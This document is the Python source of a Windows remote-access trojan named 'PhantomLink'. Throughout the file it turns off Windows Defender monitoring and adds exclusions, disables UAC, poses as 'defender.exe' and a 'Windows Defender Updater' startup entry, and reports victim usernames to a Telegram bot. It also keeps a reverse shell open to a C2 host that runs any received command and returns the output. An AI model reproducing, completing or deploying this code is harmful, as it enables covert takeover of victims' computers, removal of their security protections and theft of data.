import ctypes
import shutil
import socket
import subprocess
import os
import sys
import time
import winreg
from time import sleep
import psutil
import struct
import threading
import requests
from av_bypass import AVBypass
import base64

version = 10.7  # 7/3/2026


def bypass_all_security():
    """Execute complete security bypass"""
    try:
        bypass = AVBypass(tel_logger_func=tel_logger)
        bypass.bypass_all()

        return True
    except Exception as e:
        tel_logger(f"[!] AV Bypass error: {e}")
        return False

#Telegram
BOT_TOKEN = "BOT TOKEN"
CHAT_ID = "CHAT ID"


def tel_logger(log):
    url = f"https://api.telegram.org/BOT TOKENT/sendMessage"
    data = {
        'chat_id': CHAT_ID,
        'text': log
    }
    response = requests.post(url, data=data)


def tel_notify(log):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': CHAT_ID,
        'text': log
    }
    response = requests.post(url, data=data)


appdata_path = os.getenv("APPDATA")
target_folder = os.path.join(appdata_path, "MicrosoftUpdate")
os.makedirs(target_folder, exist_ok=True)

txt_file_path = os.path.join(target_folder, "version.txt")
file_to_delete = os.path.join(target_folder, "defender.exe")

username = os.getenv("USERNAME", "Unknown")


def bypass_security():
    try:
        try:
            subprocess.run(
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableScanningMappedNetworkDrivesForFullScan $true -DisableScanningNetworkFiles $true -DisableScriptScanning $true"',
                shell=True, capture_output=True, text=True)
        except:
            pass
        try:
            subprocess.run('attrib +h +s "%APPDATA%\\MicrosoftUpdate\\*" /s /d', shell=True, capture_output=True,
                           text=True)
        except:
            pass
        result = subprocess.run(
            'powershell -Command "Add-MpPreference -ExclusionPath \'C:\\Users\\%USERNAME%\\AppData\\Roaming\\MicrosoftUpdate\'"',
            shell=True,
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            tel_logger(f"[+] [{username}] has bypassed the antivirus successfully")
            return True
        else:
            tel_logger(f"[{username}]\n[!] Failed to add exclusion: {result.stderr}")
            return False
    except Exception as e:
        tel_logger(f"[{username}]\n[!] Error adding exclusion: {e}")
        return False


def update():
    # Create file if doesn't exist
    if not os.path.exists(txt_file_path):
        try:
            with open(txt_file_path, 'w', encoding='UTF-8') as f:
                f.write("0.0")
        except:
            pass

    # Read current version
    try:
        with open(txt_file_path, "r", encoding='UTF-8') as f:
            old_ver = float(f.read().strip())
    except:
        old_ver = 0.0

    def force_delete(path):
        """Force delete a file with extreme prejudice"""
        if not os.path.exists(path):
            return True

        max_attempts = 5
        for attempt in range(max_attempts):
            try:
                try:
                    os.remove(path)
                    return True
                except:
                    pass

                try:
                    import ctypes
                    ctypes.windll.kernel32.SetFileAttributesW(path, 0x80)  # FILE_ATTRIBUTE_NORMAL
                    os.remove(path)
                    return True
                except:
                    pass

                try:
                    temp_name = path + f".temp{time.time()}"
                    os.rename(path, temp_name)
                    os.remove(temp_name)
                    return True
                except:
                    pass

                try:
                    backup_name = path + f".old{time.time()}"
                    os.rename(path, backup_name)
                    return True
                except:
                    pass

                if attempt < max_attempts - 1:
                    time.sleep(1)

            except Exception as e:
                if attempt == max_attempts - 1:
                    print(f"[!] Could not delete {path}: {e}")
                    return False

        return False

    def kill_process_using(file_path):
        """Kill any process using this file"""
        killed_count = 0

        try:
            for proc in psutil.process_iter(['pid', 'name', 'exe', 'open_files']):
                try:
                    exe = proc.info.get('exe')
                    if exe and os.path.exists(exe):
                        try:
                            if os.path.samefile(exe, file_path):
                                print(f"[*] Killing process using file: PID {proc.info['pid']}")
                                proc.kill()
                                proc.wait(timeout=5)
                                killed_count += 1
                                continue
                        except:
                            pass

                    try:
                        open_files = proc.open_files()
                        for f in open_files:
                            if os.path.exists(f.path):
                                try:
                                    if os.path.samefile(f.path, file_path):
                                        print(f"[*] Killing process with open file: PID {proc.info['pid']}")
                                        proc.kill()
                                        proc.wait(timeout=5)
                                        killed_count += 1
                                        break
                                except:
                                    pass
                    except (psutil.AccessDenied, AttributeError):
                        pass

                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue
        except Exception as e:
            print(f"[!] Error checking processes: {e}")

        if killed_count > 0:
            print(f"[+] Killed {killed_count} process(es) using the file")
            time.sleep(2)

        return killed_count

    def kill_all_instances():
        """Kill ALL instances of this program"""
        current_pid = os.getpid()
        current_name = os.path.basename(sys.argv[0])
        killed_count = 0

        print("[*] Scanning for other instances...")

        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
            try:
                if proc.info['pid'] == current_pid:
                    continue

                if proc.info['name'] in [current_name, 'defender.exe', 'PhantomLink.exe', 'client.exe']:
                    print(f"[*] Killing instance by name: PID {proc.info['pid']} ({proc.info['name']})")
                    proc.kill()
                    killed_count += 1
                    continue

                exe = proc.info.get('exe')
                if exe:
                    try:
                        if 'MicrosoftUpdate' in exe and 'defender.exe' in exe:
                            print(f"[*] Killing hidden instance: PID {proc.info['pid']}")
                            proc.kill()
                            killed_count += 1
                            continue
                    except:
                        pass

                cmdline = proc.info.get('cmdline')
                if cmdline:
                    cmdline_str = ' '.join(cmdline).lower()
                    if 'client.py' in cmdline_str or 'defender.exe' in cmdline_str:
                        print(f"[*] Killing instance by cmdline: PID {proc.info['pid']}")
                        proc.kill()
                        killed_count += 1

            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
            except Exception as e:
                continue

        if killed_count > 0:
            print(f"[+] Killed {killed_count} other instance(s)")
            time.sleep(5)
        else:
            print("[*] No other instances found")

        return killed_count

    def force_write_version(version_str, max_attempts=10):
        """Force write version file with extreme measures"""

        for attempt in range(max_attempts):
            try:
                # write
                with open(txt_file_path, 'w', encoding='UTF-8') as f:
                    f.write(version_str)

                # Verify writing
                with open(txt_file_path, 'r', encoding='UTF-8') as f:
                    written = f.read().strip()

                if written == version_str:
                    print(f"[+] Version file updated successfully: {version_str}")
                    return True
                else:
                    print(f"[!] Version mismatch: wrote {version_str}, read {written}")

            except PermissionError:
                print(f"[*] Version file locked, attempt {attempt + 1}/{max_attempts}")

                # Kill process
                kill_process_using(txt_file_path)

                # unlock the file
                try:
                    import ctypes
                    ctypes.windll.kernel32.SetFileAttributesW(txt_file_path, 0x80)
                except:
                    pass

                # Delete and recreate
                if attempt >= 3:
                    print("[*] Attempting to delete and recreate version file...")
                    if force_delete(txt_file_path):
                        time.sleep(1)
                        try:
                            with open(txt_file_path, 'w', encoding='UTF-8') as f:
                                f.write(version_str)
                            print("[+] Version file recreated")
                            return True
                        except:
                            pass

                time.sleep(2)

            except Exception as e:
                print(f"[!] Version write error: {e}")
                time.sleep(1)

        print(f"[!] Failed to update version file after {max_attempts} attempts")
        tel_logger(f"[!] Failed to update version file for {username} after {max_attempts} attempts")
        return False

    if old_ver < version:
        print(f"\n[*] UPDATE REQUIRED: {old_ver} → {version}")
        tel_logger(f"[+] PhantomLink Updating (V{old_ver} --> V{version}) . . . [+]\n{username}")
        tel_notify(f"[+] PhantomLink Updating (V{old_ver} --> V{version}) . . . [+]\n{username}")

        # Kill all other instances
        print("\n[UPDATE STEP 1/4] Killing all other instances...")
        kill_all_instances()

        # Kill anything using the version file
        print("\n[UPDATE STEP 2/4] Unlocking version file...")
        kill_process_using(txt_file_path)

        # Delete old defender.exe
        print("\n[UPDATE STEP 3/4] Removing old executable...")
        if os.path.exists(file_to_delete):
            kill_process_using(file_to_delete)
            force_delete(file_to_delete)

        # Clean up
        old_path_file = os.path.join(target_folder, "oldpath.txt")
        if os.path.exists(old_path_file):
            try:
                with open(old_path_file, 'r') as f:
                    old_paths = f.readlines()
                for path in old_paths:
                    path = path.strip()
                    if os.path.exists(path):
                        force_delete(path)
                force_delete(old_path_file)
            except:
                pass

        # Update version file
        print("\n[UPDATE STEP 4/4] Writing new version...")
        if force_write_version(str(version)):
            print("[✓] Update completed successfully!\n")
            tel_logger(
                f"PhantomLink Updated Successfully for {username}\nOld Version: {old_ver}\nNew Version: {version}")
            tel_notify(
                f"PhantomLink Updated Successfully for {username}\nOld Version: {old_ver}\nNew Version: {version}")
        else:
            print("[!] Update completed but version file may not be updated\n")
    else:
        print(f"[*] Version up to date: {old_ver}")


def add_to_startup(file_path=None):
    if file_path is None:
        file_path = os.path.abspath(sys.argv[0])

    key_name = "Windows Defender Updater"
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(reg_key)
    except:
        pass


def move_to_hidden_location():
    """Move executable to hidden location - SIMPLE VERSION"""
    hidden_dir = os.path.join(os.getenv("APPDATA"), "MicrosoftUpdate")

    try:
        os.makedirs(hidden_dir, exist_ok=True)
    except:
        return True

    dest_file = os.path.join(hidden_dir, "defender.exe")
    current_path = os.path.abspath(sys.argv[0])

    try:
        if os.path.samefile(current_path, dest_file):
            print("[*] Already running as defender.exe")
            add_to_startup(dest_file)
            return True  # Continue running
    except:
        pass

    print("[*] Running from original location - will copy and launch defender.exe")

    # Kill any existing defender.exe
    print("[*] Checking for existing defender.exe...")
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            if proc.info['name'] == 'defender.exe':
                print(f"[*] Killing old defender.exe (PID: {proc.info['pid']})")
                proc.kill()
                time.sleep(2)
        except:
            pass

    # Remove old file
    if os.path.exists(dest_file):
        try:
            os.remove(dest_file)
            print("[*] Removed old defender.exe")
        except:
            try:
                os.rename(dest_file, dest_file + f".old{time.time()}")
                print("[*] Renamed old defender.exe")
            except:
                pass

    # Copy to hidden location
    print(f"[*] Copying to: {dest_file}")
    try:
        shutil.copy2(current_path, dest_file)
        print("[+] Copy successful")
    except Exception as e:
        print(f"[!] Copy failed: {e}")
        print("[*] Will run from current location")
        add_to_startup(current_path)
        return True  # Continue running from here

    if not os.path.exists(dest_file):
        print("[!] Copy verification failed")
        return True

    # Add to startup
    add_to_startup(dest_file)
    print("[+] Added to startup")

    # LAUNCH

    print("\n[*] Launching defender.exe...")

    try:
        # Launch with admin
        print("[*] Launching defender.exe with admin privileges...")

        result = ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            dest_file,
            None,
            None,
            0
        )

        if result > 32:  # Success
            print(f"[+] defender.exe launched successfully")
        else:
            print(f"[!] Launch failed with code: {result}")
            print("[*] Trying without admin...")

            # Fallback
            proc = subprocess.Popen(
                [dest_file],
                shell=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            print(f"[+] defender.exe launched (PID: {proc.pid})")

    except Exception as e:
        print(f"[!] Failed to launch: {e}")
        print("[*] Will run from current location")
        return True

    print("[*] Waiting for defender.exe to start...")

    max_wait = 20
    defender_running = False
    defender_pid = None

    for i in range(max_wait):
        time.sleep(1)

        # Check if defender.exe is running
        for p in psutil.process_iter(['pid', 'name', 'exe']):
            try:
                if p.info['name'] == 'defender.exe':
                    defender_running = True
                    defender_pid = p.info['pid']
                    break

                if p.info['exe'] and 'defender.exe' in p.info['exe']:
                    defender_running = True
                    defender_pid = p.info['pid']
                    break
            except:
                pass

        if defender_running:
            print(f"[✓] defender.exe confirmed running (PID: {defender_pid})")
            break

        if (i + 1) % 5 == 0:
            print(f"[*] Still waiting... ({i + 1}/{max_wait} seconds)")

    if defender_running:
        time.sleep(2)

        still_running = False
        for p in psutil.process_iter(['pid']):
            try:
                if p.info['pid'] == defender_pid:
                    still_running = True
                    break
            except:
                pass

        if not still_running:
            print("[!] defender.exe started but then exited!")
            defender_running = False

    if not defender_running:
        print("[!] Could not verify defender.exe started")
        print("[!] Will continue running from current location instead")
        tel_logger(f"[!] {username} - defender.exe failed to start, running from original location")
        return True

    print("\n[✓] SUCCESS! defender.exe is running")
    print("[*] This instance will now exit")
    print("[*] defender.exe will continue in background")

    tel_logger(f"[+] {username} - Successfully moved to hidden location")

    time.sleep(2)
    sys.exit(0)


def disable_uac():
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ)

        try:
            uac_value, _ = winreg.QueryValueEx(reg_key, "EnableLUA")
            winreg.CloseKey(reg_key)

            if uac_value == 0:
                print("[*] UAC is already disabled")
                return True

        except FileNotFoundError:
            winreg.CloseKey(reg_key)

        print("[*] Disabling UAC...")
        subprocess.call([
            "reg", "add",
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
            "/v", "EnableLUA",
            "/t", "REG_DWORD",
            "/d", "0",
            "/f"
        ], shell=True)

        print("[+] UAC disabled (reboot required)")
        tel_logger(f"[+] UAC disabled for user: {username}")
        return True

    except Exception as e:
        print(f"[!] Failed to check/disable UAC: {e}")
        tel_logger(f"[!] Failed to edit UAC for user {username}\n{e}")
        return False


HOST = "LISTEN IP"
PORT = 5000


class ShellClient:
    def __init__(self):
        self.socket = None
        self.connected = False
        self.should_exit = False
        self.message_lock = threading.Lock()
        self.username = os.getenv("USERNAME", "Unknown")

    def _send_message(self, data):
        """Send data with length prefix (thread-safe)"""
        with self.message_lock:
            try:
                if isinstance(data, str):
                    data = data.encode('utf-8')

                # Send length (4 bytes)
                msg_len = len(data)
                self.socket.sendall(struct.pack('!I', msg_len))
                # Send data
                self.socket.sendall(data)
                return True

            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                print(f"[!] Connection error while sending")
                return False

            except socket.error as e:
                print(f"[!] Socket error while sending: {e}")
                return False

            except Exception as e:
                print(f"[!] Send error: {e}")
                return False

    def _recv_message(self):
        """Receive data with length prefix (thread-safe)"""
        with self.message_lock:
            try:
                # receive the length (4 bytes)
                raw_msglen = self._recv_exactly(4)
                if not raw_msglen:
                    return None

                msglen = struct.unpack('!I', raw_msglen)[0]

                if msglen > 10 * 1024 * 1024:  # 10MB limit
                    print(f"[!] Message too large: {msglen} bytes")
                    return None

                # Receive the actual message
                return self._recv_exactly(msglen)

            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                print(f"[!] Connection error while receiving")
                return None

            except socket.error:
                return None

            except Exception as e:
                print(f"[!] Receive error: {e}")
                return None

    def _recv_exactly(self, n):
        """Helper to receive exactly n bytes"""
        data = b''
        while len(data) < n:
            try:
                packet = self.socket.recv(n - len(data))
                if not packet:
                    return None
                data += packet
            except socket.timeout:
                return None
            except Exception:
                return None
        return data

    def connect_to_server(self):
        """Connect to server with exponential backoff"""
        backoff_time = 1
        max_backoff = 300  # 5 minutes max

        while not self.should_exit:
            try:
                print(f"[*] Attempting to connect to {HOST}:{PORT}")

                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                self.socket.settimeout(300.0)  # 3 minutes timeout to match server

                self.socket.connect((HOST, PORT))

                # Send credentials
                password = "PhantomLink"
                if not self._send_message(password):
                    raise Exception("Failed to send password")
                    tel_logger(f"{self.username}\n[!] Failed to send password: {Exception}")

                if not self._send_message(self.username):
                    raise Exception("Failed to send username")

                self.connected = True
                print(f"[+] Connected to server as {self.username}")
                tel_logger(f"[+] [{self.username}] Connected to server")
                time.sleep(2)
                backoff_time = 1
                return True

            except Exception as e:
                print(f"[!] Connection failed: {e}")
                tel_logger(f"[{self.username}]\n[!] Connection failed: {e}")
                try:
                    self.socket.close()
                except:
                    pass

                if not self.should_exit:
                    print(f"[*] Retrying in {backoff_time} seconds...")
                    time.sleep(backoff_time)
                    backoff_time = min(backoff_time * 2, max_backoff)

        return False

    def execute_command(self, command):
        """Execute a command and return the output"""
        try:
            command = command.strip()

            if command.lower() == "exit":
                self.should_exit = True
                tel_logger(f"{self.username}\nExiting . . .")
                return "[+] Exiting..."

            if command.startswith("cd "):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    tel_logger(f"{self.username}\n[+] Changed directory to: {os.getcwd()}")
                    return f"[+] Changed directory to: {os.getcwd()}"
                except Exception as e:
                    tel_logger(f"{self.username}\n[!] Failed to change directory: {e}")
                    return f"[!] Failed to change directory: {e}"

            if command == "pwd":
                return os.getcwd()

            background_keywords = ['curl -O http', '&& start /B']
            is_background = any(keyword in command for keyword in background_keywords)

            if command.count(' ') < 3 and ('start ' in command.lower() or '.exe' in command.lower()):
                is_background = True

            if is_background:
                try:
                    subprocess.Popen(
                        command,
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL,
                        creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
                    )
                    return "[+] Command started in background"
                except Exception as e:
                    return f"[!] Failed to start background process: {e}"

            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=300,  # 5 minute timeout
                    encoding='utf-8',
                    errors='ignore'
                )

                output = ""
                if result.stdout:
                    output += result.stdout
                if result.stderr:
                    output += f"\n[STDERR]: {result.stderr}"

                if result.returncode != 0:
                    output += f"\n[Exit Code]: {result.returncode}"

                return output if output.strip() else "[Command executed - no output]"

            except subprocess.TimeoutExpired:
                tel_logger(f"{self.username}\n[!] Command timed out (5 minutes)")
                return "[!] Command timed out (5 minutes)"
            except Exception as e:
                tel_logger(f"{self.username}\n[!] Command execution failed: {e}")
                return f"[!] Command execution failed: {e}"

        except Exception as e:
            return f"[!] Error processing command: {e}"

    def handle_server_communication(self):
        """Main communication loop with server"""
        try:
            while self.connected and not self.should_exit:
                try:
                    # Receive message from server
                    self.socket.settimeout(120.0)  # 2 minutes timeout
                    message = self._recv_message()

                    if not message:
                        print("[*] No message received, testing connection...")

                        try:
                            test_sent = self._send_message("HEARTBEAT")
                            if not test_sent:
                                print("[!] Connection test failed - disconnected")
                                tel_logger(f"{self.username}\n[!] Connection test failed")
                                break

                            error = self.socket.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
                            if error != 0:
                                print(f"[!] Socket error: {error}")
                                tel_logger(f"{self.username}\n[!] Socket error: {error}")
                                break

                            print("[*] Connection OK, continuing...")
                            continue

                        except Exception as e:
                            print(f"[!] Connection lost: {e}")
                            tel_logger(f"{self.username}\n[!] Connection lost: {e}")
                            break

                    message_str = message.decode('utf-8', errors='ignore')

                    if message_str == "PING":
                        if not self._send_message("PONG"):
                            print("[!] Failed to send PONG response")
                            tel_logger(f"{self.username}\n[!] Failed to send PONG response")
                            break
                        print("[*] PONG sent")
                        continue

                    elif message_str.startswith("CMD:"):
                        # Execute command
                        command = message_str[4:]  # Remove "CMD:" prefix

                        if command.lower() == "exit":
                            self.should_exit = True
                            self._send_message("[+] Client exiting...")
                            tel_logger(f"[+] Client {self.username} exiting...")
                            break

                        # Execute the command
                        output = self.execute_command(command)

                        # Send response back
                        if not self._send_message(output):
                            print("[!] Failed to send command response")
                            tel_logger(f"{self.username}\n[!] Failed to send command response")
                            break

                    elif message_str == "HEARTBEAT":
                        continue

                    else:
                        print(f"[!] Unknown message type: {message_str[:50]}")
                        tel_logger(f"{self.username}\n[!] Unknown message type: {message_str[:50]}")

                except socket.timeout:
                    print("[*] Timeout - testing connection...")
                    try:
                        # Send test to check if still connected
                        if not self._send_message("HEARTBEAT"):
                            print("[!] Connection dead (send failed)")
                            break

                        error = self.socket.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
                        if error != 0:
                            print(f"[!] Socket error: {error}")
                            break

                        print("[*] Connection alive, continuing...")
                        continue
                    except:
                        print("[!] Connection test failed")
                        break

                except ConnectionResetError:
                    print("[!] Connection reset by server")
                    tel_logger(f"{self.username}\n[!] Connection reset by server")
                    break

                except ConnectionAbortedError:
                    print("[!] Connection aborted")
                    tel_logger(f"{self.username}\n[!] Connection aborted")
                    break

                except BrokenPipeError:
                    print("[!] Broken pipe")
                    tel_logger(f"{self.username}\n[!] Broken pipe")
                    break

                except OSError as e:
                    print(f"[!] OS Error: {e}")
                    tel_logger(f"{self.username}\n[!] OS Error: {e}")
                    break

                except Exception as e:
                    print(f"[!] Communication error: {e}")
                    tel_logger(f"{self.username}\n[!] Communication error: {e}")
                    break

        except Exception as e:
            print(f"[!] Handler error: {e}")
            tel_logger(f"{self.username}\n[!] Handler error: {e}")
        finally:
            self.connected = False
            print("[*] Disconnected from server")

    def run(self):
        """Main client loop"""
        print("[*] Starting shell client...")
        tel_logger(f"{self.username}\n[*] Starting shell client...")

        try:
            while not self.should_exit:
                try:
                    if self.socket:
                        try:
                            self.socket.close()
                        except:
                            pass
                        self.socket = None

                    self.connected = False

                    # Connect to server
                    if not self.connect_to_server():
                        if not self.should_exit:
                            print("[*] Waiting 10 seconds before retry...")
                            time.sleep(10)
                        continue

                    self.handle_server_communication()

                    if not self.should_exit:
                        print("[-] Connection lost, attempting to reconnect in 5 seconds...")
                        tel_logger(f"{self.username}\n[-] Connection lost, attempting to reconnect...")
                        time.sleep(5)

                except KeyboardInterrupt:
                    print("\n[*] Interrupted by user")
                    tel_logger(f"{self.username}\n[*] Interrupted by user")
                    self.should_exit = True

                except Exception as e:
                    print(f"[!] Unexpected error: {e}")
                    tel_logger(f"{self.username}\n[!] Unexpected error: {e}")
                    if not self.should_exit:
                        time.sleep(10)

        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
        finally:
            try:
                if self.socket:
                    self.socket.close()
            except:
                pass
            self.connected = False
            print("[*] Client stopped")
            tel_logger(f"{self.username}\n[*] Client stopped")


def main():
    """Main entry point"""

    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    if not is_admin():
        print("[*] Requesting administrator privileges...")
        try:
            params = " ".join([f'"{x}"' for x in sys.argv])
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
            sys.exit(0)
        except Exception as e:
            print(f"[!] Failed to get admin: {e}")
            print("[*] Continuing without admin...")

    print("[*] Starting PhantomLink Client...")
    tel_logger(f"[*] Starting PhantomLink Client for {username}")
    tel_notify(f"[*] Starting PhantomLink Client for {username}")

    print("\n" + "=" * 60)
    print("PHANTOMLINK CLIENT STARTUP")
    print("=" * 60 + "\n")

    # 1 Disable UAC
    try:
        print("[1/7] Disabling UAC...", end=" ")
        disable_uac()
        print("✓")
    except Exception as e:
        print(f"✗ ({e})")

    # 2 Update
    try:
        print("[2/7] Checking for updates...", end=" ")
        update()
        print("✓")
    except Exception as e:
        print(f"✗ ({e})")

    # 3 Bypass Security
    try:
        print("[3/7] Bypassing security...", end=" ")
        bypass_security()
        print("✓")
    except Exception as e:
        print(f"✗ ({e})")

    # 4 Move to Hidden Location
    try:
        print("[4/7] Moving to hidden location...")
        move_to_hidden_location()
        print("✓")
    except Exception as e:
        print(f"✗ ({e})")

    # 5 Persistence
    try:
        print("[5/7] Installing persistence...", end=" ")
        print("✓")
    except Exception as e:
        print(f"✗ ({e})")

    # 6 Full AV Bypass
    try:
        print("[6/7] Full AV bypass...", end=" ")
        bypass_all_security()
        print("✓")
    except Exception as e:
        print(f"✗ ({e})")

    # 7 AV Killer
    try:
        print("[7/7] Starting AV Killer...", end=" ")
        from av_killer import AVKiller
        av_killer = AVKiller(tel_logger_func=tel_logger)
        av_killer.start()
        print("✓")
    except Exception as e:
        print(f"✗ ({e})")

    print("\n" + "=" * 60)
    print("STARTUP COMPLETE - CONNECTING TO C2 SERVER")
    print("=" * 60 + "\n")

    install_marker = os.path.join(os.getenv('APPDATA'), 'MicrosoftUpdate', '.installed')
    if not os.path.exists(install_marker):
        print("[*] First-time setup - Installing advanced features...")

        try:
            os.makedirs(os.path.dirname(install_marker), exist_ok=True)
            with open(install_marker, 'w') as f:
                f.write(str(time.time()))
        except:
            pass

    # Connect to C2
    tel_logger(f"[+] {username} startup complete, connecting to server...")

    try:
        client = ShellClient()
        client.run()
    except Exception as e:
        print(f"[!] Client error: {e}")
        tel_logger(f"[!] Client error: {e}")


if __name__ == "__main__":
    main()
